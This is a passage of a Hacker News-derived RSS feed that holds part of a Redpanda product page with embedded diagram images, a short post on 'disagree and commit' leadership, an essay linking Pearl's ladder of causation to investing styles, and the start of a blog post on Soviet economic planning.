A1NC41OTk5TDE3NCA1OS45TDE3OCA2My4yOTk5SDE4My4zTDE4Ny40IDU5LjlMMTg4LjMgNTQuNTk5OUwxODUuNyA1MEwxODAuNyA0OC4yWiIgZmlsbD0iI0RERERERCIgc3Ryb2tlPSIjMzAwNTAwIiBzdHJva2Utd2lkdGg9IjQuNSIgc3Ryb2tlLW1pdGVybGltaXQ9IjEwIi8+CjxwYXRoIGQ9Ik0yMTQgNDguMkwyMDkgNTBMMjA2LjMgNTQuNTk5OUwyMDcuMiA1OS45TDIxMS4zIDYzLjI5OTlIMjE2LjZMMjIwLjcgNTkuOUwyMjEuNiA1NC41OTk5TDIxOSA1MEwyMTQgNDguMloiIGZpbGw9IiNEREREREQiIHN0cm9rZT0iIzMwMDUwMCIgc3Ryb2tlLXdpZHRoPSI0LjUiIHN0cm9rZS1taXRlcmxpbWl0PSIxMCIvPgo8cGF0aCBkPSJNMjg1LjggNzQuNUgxNTQuOFYxMTEuOUgyODUuOFY3NC41WiIgZmlsbD0iI0RERERERCIgc3Ryb2tlPSIjMzAwNTAwIiBzdHJva2Utd2lkdGg9IjQuNSIgc3Ryb2tlLW1pdGVybGltaXQ9IjEwIi8+CjxwYXRoIGQ9Ik0xODAuNyA4NS41TDE3NS43IDg3LjNMMTczIDkxLjlMMTc0IDk3LjJMMTc4IDEwMC42SDE4My4zTDE4Ny40IDk3LjJMMTg4LjMgOTEuOUwxODUuNyA4Ny4zTDE4MC43IDg1LjVaIiBmaWxsPSIjREREREREIiBzdHJva2U9IiMzMDA1MDAiIHN0cm9rZS13aWR0aD0iNC41IiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiLz4KPHBhdGggZD0iTTIxNCA4NS41TDIwOSA4Ny4zTDIwNi4zIDkxLjlMMjA3LjIgOTcuMkwyMTEuMyAxMDAuNkgyMTYuNkwyMjAuNyA5Ny4yTDIyMS42IDkxLjlMMjE5IDg3LjNMMjE0IDg1LjVaIiBmaWxsPSIjREREREREIiBzdHJva2U9IiMzMDA1MDAiIHN0cm9rZS13aWR0aD0iNC41IiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiLz4KPHBhdGggZD0iTTI4NS44IDExMi4xSDE1NC44VjE0OS41SDI4NS44VjExMi4xWiIgZmlsbD0iI0RERERERCIgc3Ryb2tlPSIjMzAwNTAwIiBzdHJva2Utd2lkdGg9IjQuNSIgc3Ryb2tlLW1pdGVybGltaXQ9IjEwIi8+CjxwYXRoIGQ9Ik0xODAuNyAxMjMuMkwxNzUuNyAxMjVMMTczIDEyOS42TDE3NCAxMzQuOEwxNzggMTM4LjJIMTgzLjNMMTg3LjQgMTM0LjhMMTg4LjMgMTI5LjZMMTg1LjcgMTI1TDE4MC43IDEyMy4yWiIgZmlsbD0iI0RERERERCIgc3Ryb2tlPSIjMzAwNTAwIiBzdHJva2Utd2lkdGg9IjQuNSIgc3Ryb2tlLW1pdGVybGltaXQ9IjEwIi8+CjxwYXRoIGQ9Ik0yMTQgMTIzLjJMMjA5IDEyNUwyMDYuMyAxMjkuNkwyMDcuMiAxMzQuOEwyMTEuMyAxMzguMkgyMTYuNkwyMjAuNyAxMzQuOEwyMjEuNiAxMjkuNkwyMTkgMTI1TDIxNCAxMjMuMloiIGZpbGw9IiNEREREREQiIHN0cm9rZT0iIzMwMDUwMCIgc3Ryb2tlLXdpZHRoPSI0LjUiIHN0cm9rZS1taXRlcmxpbWl0PSIxMCIvPgo8cGF0aCBkPSJNMzM4LjMgNTAuMkwzNDIuMyAzOC4yIiBzdHJva2U9IiMzMDA1MDAiIHN0cm9rZS13aWR0aD0iNC41IiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiLz4KPHBhdGggZD0iTTM1MyA2MC44TDM2Mi4yIDUyLjUiIHN0cm9rZT0iIzMwMDUwMCIgc3Ryb2tlLXdpZHRoPSI0LjUiIHN0cm9rZS1taXRlcmxpbWl0PSIxMCIvPgo8cGF0aCBkPSJNMzEwIDE4OS42SDE0MC4xVjE5NS41SDMxMFYxODkuNloiIGZpbGw9IiNEREREREQiLz4KPHBhdGggZD0iTTMwMS4xIDU1LjM5OTlMMjU0IDcxLjc5OTlWMTE1LjFMMjcyLjcgMTQ2LjZMMzAwLjkgMTY1TDMwMS4xIDE2NS4xTDMwMS40IDE2NC45TDMyOS42IDE0Ni42TDM0OC4zIDExNS4xVjcxLjY5OTlMMzAxLjEgNTUuMzk5OVoiIGZpbGw9IiNDQzM4MDUiIHN0cm9rZT0iIzMwMDUwMCIgc3Ryb2tlLXdpZHRoPSI0LjUiIHN0cm9rZS1taXRlcmxpbWl0PSIxMCIvPgo8cGF0aCBkPSJNMjgyLjEgMTA4LjFMMjk3LjkgMTIyLjRMMzI2LjYgODUuNiIgc3Ryb2tlPSIjRkZFOEQ2IiBzdHJva2Utd2lkdGg9IjYuNzQxMyIgc3Ryb2tlLW1pdGVybGltaXQ9IjEwIi8+Cjwvc3ZnPgo=" alt="undefined diagram"></p><div><h4>Zero data loss</h4><p>Redpanda leverages the Raft consensus algorithm for managing the replicated log, giving you sound primitives for configuration and data-replication. No matter the scale, we keep your data safe.</p></div></div></div><div><div><p><img src="https://vectorized.io/static/self-tuning-31f491c46fa40875027969373688f309.svg" alt="undefined diagram"></p><div><h4>Self tuning</h4><p>Free yourself from the tuning whack-a-mole. Redpanda Keeper (RPK) automatically tunes your kernel to yield the optimal settings for your hardware+kernel+redpanda combination, every time.</p></div></div></div><div><div><p><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTA5IiBoZWlnaHQ9IjIxNCIgdmlld0JveD0iMCAwIDUwOSAyMTQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0zMTIuMDU5IDU3LjM3ODlMMzEwLjg1NiA1Ni4xNzYzTDMwOS42NTQgNTcuMzc4OUwzMTAuODU2IDU4LjU4MTZMMzEyLjA1OSA1Ny4zNzg5WiIgc3Ryb2tlPSIjMzAwNTAwIiBzdHJva2Utd2lkdGg9IjQuNTQ2MyIgc3Ryb2tlLW1pdGVybGltaXQ9IjEwIi8+CjxwYXRoIGQ9Ik0yMDMuMDY4IDE1OC4xNDdMMjAxLjg2NSAxNTYuOTQ1TDIwMC42NjMgMTU4LjE0N0wyMDEuODY1IDE1OS4zNUwyMDMuMDY4IDE1OC4xNDdaIiBzdHJva2U9IiMzMDA1MDAiIHN0cm9rZS13aWR0aD0iNC41NDYzIiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiLz4KPHBhdGggZD0iTTM3OC45IDE3NC44SDE3MC45VjE3OS4ySDM3OC45VjE3NC44WiIgZmlsbD0iI0RERERERCIvPgo8cGF0aCBkPSJNMTcyLjcgMTQxLjRIMjc5LjNWMTUzLjlMMzA4LjYgMTI0LjZMMjc5LjMgOTUuM1YxMDcuOEgxNzIuNyIgZmlsbD0iI0VENjMzOCIvPgo8cGF0aCBkPSJNMTcyLjcgMTQxLjRIMjc5LjNWMTUzLjlMMzA4LjYgMTI0LjZMMjc5LjMgOTUuM1YxMDcuOEgxNzIuNyIgc3Ryb2tlPSIjMzAwNTAwIiBzdHJva2Utd2lkdGg9IjQuNSIgc3Ryb2tlLW1pdGVybGltaXQ9IjEwIi8+CjxwYXRoIGQ9Ik0xOTAuMiA3OC4xSDI1OS4zVjg3LjVMMjgxLjIgNjUuNUwyNTkuMyA0My41VjUyLjlIMTkwLjIiIGZpbGw9IiNFRDYzMzgiLz4KPHBhdGggZD0iTTE5MC4yIDc4LjFIMjU5LjNWODcuNUwyODEuMiA2NS41TDI1OS4zIDQzLjVWNTIuOUgxOTAuMiIgc3Ryb2tlPSIjMzAwNTAwIiBzdHJva2Utd2lkdGg9IjQuNSIgc3Ryb2tlLW1pdGVybGltaXQ9IjEwIi8+CjxwYXRoIGQ9Ik0xNTguNjAxIDEyOS44SDE3NS4xMDEiIHN0cm9rZT0iIzMwMDUwMCIgc3Ryb2tlLXdpZHRoPSI0LjUiIHN0cm9rZS1taXRlcmxpbWl0PSIxMCIvPgo8cGF0aCBkPSJNMTY3LjEwMSAxMjAuM0gxNzkuOTAxIiBzdHJva2U9IiMzMDA1MDAiIHN0cm9rZS13aWR0aD0iNC41IiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiLz4KPHBhdGggZD0iTTE1MC45IDExNi4ySDE2MC43IiBzdHJva2U9IiMzMDA1MDAiIHN0cm9rZS13aWR0aD0iNC41IiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiLz4KPHBhdGggZD0iTTE3NC4zMDEgNzAuNjAwMUgxOTAuODAxIiBzdHJva2U9IiMzMDA1MDAiIHN0cm9rZS13aWR0aD0iNC41IiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiLz4KPHBhdGggZD0iTTE4Mi44MDEgNjEuMTAwMUgxOTUuNjAxIiBzdHJva2U9IiMzMDA1MDAiIHN0cm9rZS13aWR0aD0iNC41IiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiLz4KPHBhdGggZD0iTTE2Ni42MDEgNTdIMTc2LjUwMSIgc3Ryb2tlPSIjMzAwNTAwIiBzdHJva2Utd2lkdGg9IjQuNSIgc3Ryb2tlLW1pdGVybGltaXQ9IjEwIi8+CjxwYXRoIGQ9Ik0zMTMuMzAxIDEwMi40SDM2MC4wMDFWMTExLjFMMzgwLjUwMSA5MC42MDAxTDM2MC4wMDEgNzAuMTAwMVY3OC45MDAxSDI4OS4zMDEiIGZpbGw9IiNFRDYzMzgiLz4KPHBhdGggZD0iTTMxMy4zMDEgMTAyLjRIMzYwLjAwMVYxMTEuMUwzODAuNTAxIDkwLjYwMDFMMzYwLjAwMSA3MC4xMDAxVjc4LjkwMDFIMjg5LjMwMSIgc3Ryb2tlPSIjMzAwNTAwIiBzdHJva2Utd2lkdGg9IjQuNSIgc3Ryb2tlLW1pdGVybGltaXQ9IjEwIi8+Cjwvc3ZnPgo=" alt="undefined diagram"></p><div><h4>10x faster</h4><p>Redpanda is a new storage engine, optimized for streaming data, using a thread-per-core architecture focused on delivering stable tail-latencies. Using true async interfaces, Redpanda can saturate any device. </p></div></div></div></div><div><div><div><p>Native Prometheus Support</p><p>✔</p></div><div><p>Zero Data Loss</p><p>Possible - performance decrease</p><p>✔ Safe by default</p></div><div><p>Partition Limit</p><p>200,000</p><p>2,000,000+</p></div><div><p>Resilient to Scan-The-World</p><p>✔ No page cache</p></div></div></div><p><small>*Late 2020</small></p></div></div></div>]]>
            </description>
            <link>https://vectorized.io/redpanda/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084738</guid>
            <pubDate>Fri, 13 Nov 2020 17:24:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Disagree and Commit]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25084729">thread link</a>) | @endlessvoid94
<br/>
November 13, 2020 | https://davepaola.com/2020/11/13/disagree-and-commit/ | <a href="https://web.archive.org/web/*/https://davepaola.com/2020/11/13/disagree-and-commit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-577">
	
		<p><img width="825" height="510" src="https://i0.wp.com/davepaola.com/wp-content/uploads/2020/11/pexels-photo-3760790.jpeg?resize=825%2C510&amp;ssl=1" alt="mad formal executive man yelling at camera" loading="lazy" srcset="https://i0.wp.com/davepaola.com/wp-content/uploads/2020/11/pexels-photo-3760790.jpeg?resize=825%2C510&amp;ssl=1 825w, https://i0.wp.com/davepaola.com/wp-content/uploads/2020/11/pexels-photo-3760790.jpeg?zoom=2&amp;resize=825%2C510&amp;ssl=1 1650w" sizes="(max-width: 825px) 100vw, 825px" data-attachment-id="1487" data-permalink="https://davepaola.com/2020/11/13/disagree-and-commit/pexels-photo-3760790/" data-orig-file="https://i0.wp.com/davepaola.com/wp-content/uploads/2020/11/pexels-photo-3760790.jpeg?fit=1880%2C1253&amp;ssl=1" data-orig-size="1880,1253" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;Photo by Andrea Piacquadio on <a href=\&quot;https:\/\/www.pexels.com\/photo\/mad-formal-executive-man-yelling-at-camera-3760790\/\&quot; rel=\&quot;nofollow\&quot;>Pexels.com<\/a>&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;mad formal executive man yelling at camera&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="pexels-photo-3760790" data-image-description="" data-medium-file="https://i0.wp.com/davepaola.com/wp-content/uploads/2020/11/pexels-photo-3760790.jpeg?fit=300%2C200&amp;ssl=1" data-large-file="https://i0.wp.com/davepaola.com/wp-content/uploads/2020/11/pexels-photo-3760790.jpeg?fit=660%2C440&amp;ssl=1">	</p><!-- .post-thumbnail -->

	
	<!-- .entry-header -->

	<div>
		<p>Someone once told me that as a member of the executive team at a growing technology startup, whenever there is a Big Decision that must be made, you have three choices:</p>
<ol>
<li>Agree and commit</li>
<li>Disagree and commit</li>
<li>Don’t let the door hit your ass on the way out</li>
</ol>
<p>Obviously this is a bit tongue-in-cheek, but I’ve found it hugely clarifying over the course of my career.</p>
<p><strong>Agree and commit</strong></p>
<p>This is the happy path. Healthy debate has occurred, and the decision was made according to the path you preferred. You’re on easy street and immediately leap into next steps.</p>
<p><strong>Disagree and commit</strong></p>
<p>This is&nbsp;<em>hard</em>. You argued your perspective. You used your credibility and the best of your persuasive abilities. You brought data to the discussion that backs up your argument. You provided lots of evidence. And the team went in a different direction.</p>
<p>You’re at a critical juncture. How you conduct yourself and move forward will speak volumes about your leadership style. Now is the moment when you will either:</p>
<ol>
<li>Proliferate politics and frustrate your team by remaining ambiguous about your team’s goals, inhibit progress, throw up roadblocks to the team’s momentum, or</li>
<li>Foster a focused team rallying behind a clear direction.</li>
</ol>
<p>Obviously if this happens frequently enough, you may just need to part ways. But I’ve found for the vast majority of Big Decisions, disagree and commit is the right path. You deepen your professional relationships, build empathy and respect for other points of view, coach or assist your direct reports (and learn from them) on this process, and ultimately learn a ton about yourself and your values.</p>
	</div><!-- .entry-content -->

	
<!-- .author-info -->

	<!-- .entry-footer -->

</article></div>]]>
            </description>
            <link>https://davepaola.com/2020/11/13/disagree-and-commit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084729</guid>
            <pubDate>Fri, 13 Nov 2020 17:23:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Investing and Causation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25084628">thread link</a>) | @krasney
<br/>
November 13, 2020 | https://ni.chol.as/posts/investing-causation/ | <a href="https://web.archive.org/web/*/https://ni.chol.as/posts/investing-causation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>There are lots of ways to invest. Holding cash, holding index funds, buying and turning around whole companies, and hedging stocks are all different ways to try to generate returns.</p>
<p>What do you have to believe about the world to invest in one versus the other?</p>
<p>I’ve been thinking about Judea Pearl’s <a href="https://en.wikipedia.org/wiki/Causal_model#Ladder_of_causation" target="_blank" rel="nofollow noopener noreferrer">Ladder of Causation</a>, and what it can tell us about how different investment classes let investors buy into different abstractions of “cause and effect.” Pearl proposes three views of cause and effect: association, intervention, and counterfactuals. In this post, I speculate that this is a useful way to understand what investors have to believe about the world for their investment to make sense.</p>
<p>What does this mean? Here is Pearl’s Ladder:</p>
<p><span>
      <a href="https://ni.chol.as/static/c2d878115f97908f86d6b6054bbc2cde/c5bb3/ladder-of-causation.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://ni.chol.as/static/c2d878115f97908f86d6b6054bbc2cde/8ac56/ladder-of-causation.webp 240w,
https://ni.chol.as/static/c2d878115f97908f86d6b6054bbc2cde/d3be9/ladder-of-causation.webp 480w,
https://ni.chol.as/static/c2d878115f97908f86d6b6054bbc2cde/35037/ladder-of-causation.webp 680w" sizes="(max-width: 680px) 100vw, 680px" type="image/webp">
        <source srcset="https://ni.chol.as/static/c2d878115f97908f86d6b6054bbc2cde/8ff5a/ladder-of-causation.png 240w,
https://ni.chol.as/static/c2d878115f97908f86d6b6054bbc2cde/e85cb/ladder-of-causation.png 480w,
https://ni.chol.as/static/c2d878115f97908f86d6b6054bbc2cde/c5bb3/ladder-of-causation.png 680w" sizes="(max-width: 680px) 100vw, 680px" type="image/png">
        <img src="https://ni.chol.as/static/c2d878115f97908f86d6b6054bbc2cde/c5bb3/ladder-of-causation.png" alt="Judea Pearl's Ladder of Causation, from The Book of Why" title="Judea Pearl's Ladder of Causation, from The Book of Why" loading="lazy">
      </picture>
  </a>
    </span></p>
<p>The ladder exposes three levels of abstraction about cause and effect.</p>
<p><strong>Association</strong>, or correlation, shows that two variables seem to move together. This abstraction might include, for instance, that rainbows are associated with rain. But <a href="https://www.tylervigen.com/spurious-correlations" target="_blank" rel="nofollow noopener noreferrer">correlations can be spurious</a>, which is why everybody knows that “correlation isn’t causation.”</p>
<p><strong>Intervention</strong> is “doing something” to measure or cause an effect. In drug trials, researchers will give a drug to one group of patients, and a placebo to another group of patients, to measure the effect that  the drug caused.</p>
<p><strong>Counterfactuals</strong> are understanding what <em>would have happened</em> if a cause was absent. For example, you can ask what would have happened to your headache if you hadn’t taken the aspirin. Based on lived experience and previous interventions of aspirin, you might conclude that your headache would have continued until it naturally subsided. But this depends on a model that you have about what effects aspirin causes with respect to headaches.</p>
<p>The higher you go on the ladder, the richer your model of the cause-and-effect has to be. Association requires that you observe and notice two or more things about the world, and that they may be connected. Intervention requires being able to create meaningful change in the environment and notice the impact. Counterfactual reasoning requires having a fully-fledged model of cause and effect, so you can imagine the world under different circumstances.</p>
<p>We can translate this framework to investing:</p>
<ul>
<li><strong>Association investing:</strong> Investors invest based on their ability to notice associations in the market. They do not affect pricing or intervene in management decisions.</li>
<li><strong>Intervention investing:</strong> Investors invest based on their ability to affect price, management decisions, or events facing the market or firm. This can come through outright ownership. influence on management, or publicizing information as an activist investor.</li>
<li><strong>Counterfactual investing:</strong> These “alternative” asset classes involve writing contracts with contingent claims based on events, future prices, or by litigating. This includes insurance, options, and certain kinds of litigation.</li>
</ul>
<h2 id="association-passive-and-active-investing"><a href="#association-passive-and-active-investing" aria-label="association passive and active investing permalink"></a>Association: Passive and Active Investing</h2>
<p><strong>Passive investors</strong> are our first step onto the ladder. Buying an index fund requires no model of the world. Passive investors do not change their allocations based on anything besides the weighting of stocks in the market. They are completely indifferent to events, press releases, meteor strikes, or any other event besides a change of weighting in the stock market. They don’t intervene in anything, and since they are unable to use discretion to sell, the most the largest index funds can do is to <a href="https://hbr.org/2016/05/research-index-funds-are-improving-corporate-governance" target="_blank" rel="nofollow noopener noreferrer">try to improve governance</a>.</p>
<p>As the base of the ladder, it is unsurprising that this is the performance benchmark other asset classes are judged against.</p>
<p><strong>Retail active investors</strong>—ranging from stock pickers sitting at home to black-box quant funds—are the next step up. They have no practical ability or desire to affect management decisions or the price of the stock, so their entire source of profit is from associations that they don’t believe the market has noticed or priced into the stock.</p>
<p>Association investing is increasingly hard to be smart at. Quant funds that use sophisticated statistical techniques to mine these kinds of “unseen” associations are in <a href="https://www.bloomberg.com/opinion/articles/2019-01-19/quant-funds-poor-performance-may-not-be-temporary" target="_blank" rel="nofollow noopener noreferrer">secular decline</a> as their job becomes harder and harder. Conventional wisdom also suggests that being <a href="https://onlinelibrary.wiley.com/doi/full/10.1111/j.1540-6261.1997.tb03808.x" target="_blank" rel="nofollow noopener noreferrer">persistently good at stock picking</a> is very hard, if not indistinguishable from statistical noise.</p>
<h2 id="intervention-activist-investors-and-private-equity"><a href="#intervention-activist-investors-and-private-equity" aria-label="intervention activist investors and private equity permalink"></a>Intervention: Activist Investors and Private Equity</h2>
<p>With enough capital, some investors are able to affect the pricing of a stock or management decisions, and can actively intervene in the market to get a desired result.</p>
<p><strong>Activist investors</strong>, like Bill Ackman’s Pershing Square Capital Management, are able to affect the stock price by owning a fraction of a company and demanding changes to management. With this intervention, activist investors are able to negotiate on some management decisions at the firm without (always) having to purchase a huge percentage.</p>
<p><strong>LBO (leveraged buyout) firms</strong>, including private equity firms, raise debt to purchase firms outright, and then have full control over management and strategic decisions. While these firms can work to identify efficiencies and strategic opportunities, they are often subject to the <a href="https://en.wikipedia.org/wiki/Winner%27s_curse" target="_blank" rel="nofollow noopener noreferrer">winner’s curse</a>: with no additional information, no synergies with other assets, and no other ability to cause market-moving events, the highest-bidding private equity firm is often the only firm optimistic enough to bid that much on that asset. </p>
<p>These firms also often charge large fees. One question is: can you automatically replicate private equity or hedge fund returns with an <em>associative</em> strategy, and not an <em>interventionist</em> strategy? Erik Stafford at Harvard Business School seems to think so, and articulated a scheme in which you could <a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=2720479" target="_blank" rel="nofollow noopener noreferrer">replicate private equity returns without needing to intervene in firms</a> and pay these fees.</p>
<h2 id="counterfactuals-derivatives-insurance-and-lawsuits"><a href="#counterfactuals-derivatives-insurance-and-lawsuits" aria-label="counterfactuals derivatives insurance and lawsuits permalink"></a>Counterfactuals: Derivatives, Insurance, and Lawsuits</h2>
<p>Finally, we come to the top of the ladder: counterfactual investing. I see this as investing in contingent claims, or claims that only pay out when a specific event happens, or based on the price of assets at a specific time.</p>
<p><strong>Options, futures, and other derivatives</strong> are our first counterfactual rung. An options writer has to price options using a model of the world like Black-Scholes, and understand their prospective risk based on the rest of their portfolio. Derivatives can be risky: the seller of a call option, for instance, can lose and unlimited amount of money. Unlike insurance, derivatives traders are only exposed to risk related to the pricing of the asset, not specific underlying events in the world that might change that price.</p>
<p>That makes options trading slightly different from <strong>insurance</strong>. Insurers get paid a fixed rate, and owe money if a specific event occurs in the future. These claims can be as small and frequent as broken bones, car accidents, or stolen property and as large as <a href="https://www.insurancejournal.com/news/international/2020/04/13/564598.htm" target="_blank" rel="nofollow noopener noreferrer">pandemic</a> or <a href="https://link.springer.com/article/10.1057/palgrave.gpp.2510009" target="_blank" rel="nofollow noopener noreferrer">terrorism insurance</a>. In this instance, they know exactly what their counterfactual is: if the event hadn’t happened, they wouldn’t be subject to a payout, so insurers have to price the upfront stream of income based on the probability of an event happening, and the economic severity if it does happen.</p>
<p>Hedging and insurance strategies are products that can create value for buyers and sellers alike. I am better off for having health insurance, for instance, for reasons that are not purely financial, and a cattle trader may wish to hedge around their wealth being tied up in cattle. As a financial asset class, however, it is difficult for options traders to show that they are really doing something “smart” to deserve their exorbitant fees. Erik Stafford found that alternative investments, in aggregate, are <a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=1910719" target="_blank" rel="nofollow noopener noreferrer">often no better than a strategy of dumb put-writing</a>, which suggests that this complex counterfactual reasoning is overpriced after fees.</p>
<p>Finally, we have certain kinds of lawsuits, especially those related to securities fraud. Matt Levine has a great description of these in his peerless financial newsletter, <a href="https://www.bloomberg.com/opinion/articles/2019-06-26/everything-everywhere-is-securities-fraud" target="_blank" rel="nofollow noopener noreferrer">Money Stuff</a>:</p>
<blockquote>
<p>You know the basic idea. A company does something bad, or something bad happens to it. Its stock price goes down, because of the bad thing. Shareholders sue: Doing the bad thing and not immediately telling shareholders about it, the shareholders say, is securities fraud. Even if the company does immediately tell shareholders about the bad thing, which is not particularly common, the shareholders might sue, claiming that the company failed to disclose the conditions and vulnerabilities that allowed the bad thing to happen.</p>
</blockquote>
<p>In this instance, shareholders don’t have a contingent claim against any specific event, but will claim that management has defrauded them when a “bad thing” happens. These lawsuits say that management “should have” acted differently, and if they had, things would be better. (Note that no sane attorney would quite craft it this way—they need to demonstrate acts of fraud, after all—but the point stands.) As described, this kind of litigation is counterfactual investing in its purest form.</p>

<p>Active investing is hard, and every non-passive investment product has an incentive to show that they are using some causal magic to create superior returns value.</p>
<p>To scrutinize this, a few questions to ask include:</p>
<ul>
<li>Is this investment capturing an association that isn’t accurately priced by the market?</li>
<li>Is this investment causing an intervention that is going to create and capture value?</li>
<li>Is this investment modeling the probability of contingent events in a way that isn’t captured by the market?</li>
<li>Isn’t there a synthetic way to generate the same returns at this level of risk—for instance, via put-writing—without having to pay fees?</li>
</ul>
<p>The answers to these questions is usually “no,” because again, active investing is hard. If it isn’t, however, it should say something interesting about what you have to believe about the world for a particular investment strategy to make sense.</p></div></div>]]>
            </description>
            <link>https://ni.chol.as/posts/investing-causation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084628</guid>
            <pubDate>Fri, 13 Nov 2020 17:18:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimizing Things in the USSR (2016)]]>
            </title>
            <description>
<![CDATA[
Score 121 | Comments 140 (<a href="https://news.ycombinator.com/item?id=25084479">thread link</a>) | @amai
<br/>
November 13, 2020 | https://chris-said.io/2016/05/11/optimizing-things-in-the-ussr/ | <a href="https://web.archive.org/web/*/https://chris-said.io/2016/05/11/optimizing-things-in-the-ussr/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>11 May 2016</span></p><meta charset="utf-8">



<p>As a data scientist, a big part of my job involves picking metrics to optimize and thinking about how to do things as efficiently as possible. With these types of questions on my mind, I recently discovered a totally fascinating book about about economic problems in the USSR and the team of data-driven economists and computer scientists who wanted to solve them. The book is called <a href="http://www.amazon.com/Red-Plenty-Francis-Spufford/dp/1555976042"><em>Red Plenty</em></a>. It’s actually written as a novel, weirdly, but it nevertheless presents an accurate economic history of the USSR. It draws heavily on an earlier book from 1973 called <a href="http://www.amazon.com/Planning-Problems-USSR-Contribution-Mathematical/dp/0521202493"><em>Planning Problems in the USSR</em></a>, which I also picked up. As I read these books, I couldn’t help but notice some parallels with planning in any modern organization. In what will be familiar to any data scientist today, the second book even includes a quote from a researcher who complained that 90% of his time was spent cleaning the data, and only 10% of his time was spent doing actual modeling!</p>

<p>Beyond all the interesting parallels to modern data science and operations research, these books helped me understand a lot of interesting things I previously knew very little about, such as linear programming, price equilibria, and Soviet history. This blog post is about I learned.</p>

<h4>Balance sheets and manual calculation: Kind of a trainwreck</h4>

<p>The main task in the centrally planned Soviet economy was to allocate resources so that a desired assortment of goods and services was produced. Every year, certain target outputs for each good were established. Armed with estimates of the available input resources, central administrators used balance sheets to set plans for every factory, specifying exactly how much input commodities each factory would receive, and how much output it should produce. Up through the 1960s, this was always done by manual calculation. Since there were hundreds of thousands of commodities, and since the supply chains had many dependency steps, it was impossible to compute the full balance sheets for the economy. The administrators therefore decided to make some simplifying assumptions. As a result of these these simplifying assumptions, resource allocation became a bit of a trainwreck. Below are a few of the simplifications and their consequences.</p>

<ul>
  <li><strong>Dimensionality reduction by removing variables.</strong> Because there were too many commodities to track, administrators often limited their analysis to the 10,000 most important commodities in the economy. But when the production of those commodities were planned, there was often a hidden shortage of commodities whose output was not planned centrally but which were used as inputs to one of the 10,000 planned products. Factories that depended on those commodities often sat idle for months as they waited for the shortages to end.</li>
  <li><strong>Dimensionality reduction by aggregation.</strong> Apparently, steel tubes can come in thousands of different types. They can come in different lengths, different shapes, and different compositions. To reduce the dimensionality of the problem, administrators would often track the total tonnage of a few broad classes of steel tubes in the models, rather than using a more detailed classification scheme. While their models successfully balanced the tonnage of tubes for the broad categories (the output in tons of tube-producing factories matched the input requirements in tons of tube-consuming factories), there were constant surpluses of some specific types of tubes, and shortages of other specific types of tubes.&nbsp;In particular, since tonnage was used as a metric, tube-producing factories were overly incentivized to make easy-to-produce thick tubes. As a result, thin tubes were always in short supply.</li>
  <li><strong>Propagating adjustments only a few degrees back.</strong> Let’s say that during balance calculations, the administrators realized they needed to bump up the target output of one commodity. If they did that, it was also necessary to bump up the output targets of commodities that were input into the target commodity. But if they did <em>that</em>, they also needed to bump up the output targets of commodities that fed into those commodities, and so on! This involved a crazy amount of extra hand calculations every time they needed make an adjustment. To simplify things, the administrators typically made adjustments to the first-order suppliers, without making the necessary adjustments to the suppliers of the suppliers. This of course led to critical shortages of input commodities, which again led to idle factories.</li>
</ul>

<!-- The tooltip has absolute positioning, which means it is positioned
"relative" to any parent it has who has either absolute or relative positioning.
The #econ_scatter parent would by default be static, so I have to change it to
relative -->
<div>
  
  
  <p><strong>Figure 1.</strong> Some example inputs and outputs in the Soviet economy in 1951, described in units of weight. This summary shows an extreme dimensionality reduction, more extreme than was ever used in planning. In this diagram, most commodities are excluded and each displayed commodity collapses across multiple different product types. Multiple steps in the supply chain are collapsed into a single step. (Source: <a href="http://www.foia.cia.gov/sites/default/files/document_conversions/89801/DOC_0000380738.pdf">CIA</a>)</p>
</div>

<p><br>Even if the administrators could get the accounting correct, which they couldn’t, their attempts to allocate resources would still be far from optimal. In the steel industry, for example, some factories were better at producing some types of tubes whereas others were better at producing other types of tubes. Since there were thousands of different factories and tube types, it was non-trivial to decide how to best distribute resources and output requirements, and it was not immediately obvious which factories should be expanded and which should be closed down.</p>

<h4>Supply chain optimizations</h4>

